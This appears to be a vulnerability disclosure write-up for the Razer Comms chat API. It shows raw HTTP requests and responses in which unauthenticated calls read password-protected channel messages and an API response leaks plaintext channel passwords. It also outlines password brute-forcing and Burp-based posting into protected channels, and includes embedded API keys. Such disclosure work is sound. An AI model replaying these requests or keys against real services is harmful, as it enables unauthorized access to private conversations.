You can read the contents in any channel (passworded or not) by knowing its channelID and community ID which are public knowledge for open communities and are retrieved after joining a community.

To get all channels and their IDs in a community (test to see if you need to be banned or not)

```
GET /communities/communityID/channels?api_key=apikey
GET /communities/0e7072b3c885a0242e0f31ac702a6d57715c89de/channels?api_key=tdVKzPO8fAo8uX0Ad6OV798jFR%2F2AFyd1FKTktutQrVMzTFhNUQz36zTyPHWGe5BvFM%3D HTTP/1.1
Host: api.comms.razerzone.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://d16tq8kr674p5c.cloudfront.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Referer: http://d16tq8kr674p5c.cloudfront.net/communities/main/?api_key=tdVKzPO8fAo8uX0Ad6OV798jFR%2f2AFyd1FKTktutQrVMzTFhNUQz36zTyPHWGe5BvFM%3d&id=0e7072b3c885a0242e0f31ac702a6d57715c89de&l=en
Accept-Encoding: gzip,deflate
Accept-Language: en-us,en;q=0.8
```


To read messages in any channel - as you can see the request is unauthenticated too.

```
GET /communities/communityID/channels/channelID/messages
GET /communities/0e7072b3c885a0242e0f31ac702a6d57715c89de/channels/99dfcac9740dc0f1b22fa5954413ad9ff6ba814d/messages HTTP/1.1
Host: api.comms.razerzone.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://d16tq8kr674p5c.cloudfront.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Referer: http://d16tq8kr674p5c.cloudfront.net/communities/main/?api_key=tdVKzPO8fAo8uX0Ad6OV798jFR%2f2AFyd1FKTktutQrVMzTFhNUQz36zTyPHWGe5BvFM%3d&id=0e7072b3c885a0242e0f31ac702a6d57715c89de&l=en
Accept-Encoding: gzip,deflate
Accept-Language: en-us,en;q=0.8
```
-----

When channel password is changed, older passwords will not work anymore. But you can read them anyways, probably can post too but a PoC is more complex because it involves getting a token from the XMPP server.

You can post in any password protected channel, put Burp on intercept. Post in any channel, modify the channelID in outgoing websocket (to XMPP server) requests and then the PUT request and it will be posted in the password protected channel.

**So the password essentially does nothing.**

----
You can essentially bruteforce channel passwords, however users can create long passwords.

The owner of the chat channel, gets the password in response to the GET community chat channels with APIKey.

```
GET /communities/6d00466ae554d1e2c5b5d2029b184d7a7c036422/channels?api_key=kVTr28l9BsdK4FXEDhtNrx37BEtaTy8IZmTIqKRPkFqD1okoyL38YchbVs6Y%2FOpxD%2FI%3D HTTP/1.1
Host: api.comms.razerzone.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://d16tq8kr674p5c.cloudfront.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Referer: http://d16tq8kr674p5c.cloudfront.net/communities/main/?api_key=kVTr28l9BsdK4FXEDhtNrx37BEtaTy8IZmTIqKRPkFqD1okoyL38YchbVs6Y%2fOpxD%2fI%3d&id=6d00466ae554d1e2c5b5d2029b184d7a7c036422&l=en
Accept-Encoding: gzip,deflate
Accept-Language: en-us,en;q=0.8
```

Chat channel password is in response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Sun, 01 May 2016 03:47:20 GMT
Server: nginx/1.4.6 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Length: 542
Connection: Close

{"total":2,"count":2,"data":[{"id":"da685d267d4149b04c03c4b67336b570971213f8","name":"Game lobby","active":1,"password":"","sub_channels":0,"lobby":true,"text_muted":false,"voice_muted":false,"created":"2016-04-23T07:43:38+00:00","topic":"","anti_spam":false},{"id":"73473907abacdf716514652a663414ebb8bce77c","name":"newchatchannel","active":0,"protected":true,"prompt_password":true,"password":"1234","sub_channels":0,"lobby":false,"text_muted":false,"voice_muted":false,"created":"2016-05-01T03:46:07+00:00","topic":"","anti_spam":false}]}
```

The rest need to do something like this.

``` 
POST /communities/6d00466ae554d1e2c5b5d2029b184d7a7c036422/channels/73473907abacdf716514652a663414ebb8bce77c/join HTTP/1.1
Host: api.comms.razerzone.com
Connection: close
Content-Length: 17
Accept: application/json, text/javascript, */*; q=0.01
Authorization: Basic
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d16tq8kr674p5c.cloudfront.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Referer: http://d16tq8kr674p5c.cloudfront.net/communities/main/?api_key=mlCBEVP4R%2bhAyQiF0G5t%2fw8Nh6QL4nrSKqLMU%2fZEHKvuFR7mXrB9dqS3ibow65Ea3Bk%3d&id=6d00466ae554d1e2c5b5d2029b184d7a7c036422&l=en
Accept-Encoding: gzip,deflate
Accept-Language: en-us,en;q=0.8

{"password":"11"}
```

If password is wrong the response is a 403 forbidden:

```
HTTP/1.1 403 Forbidden
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Sun, 01 May 2016 03:50:09 GMT
Server: nginx/1.4.6 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Length: 61
Connection: Close

{
  "error":{
    "message":"Invalid channel password"
  }
}
```

Response to successful login:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Sun, 01 May 2016 04:06:27 GMT
Server: nginx/1.4.6 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Length: 304
Connection: Close

{"success":true,"user":{"name":"randomCommsID2","id":"...@razerzone.com","voice_enabled":false,"voice_muted":false,"text_muted":false,"role":"member","me":false,"online":false,"channel":"","comms_id":"randomCommsID2","mic_mute":false,"join_date":"2016-05-01T00:51:12+00:00"}}
```
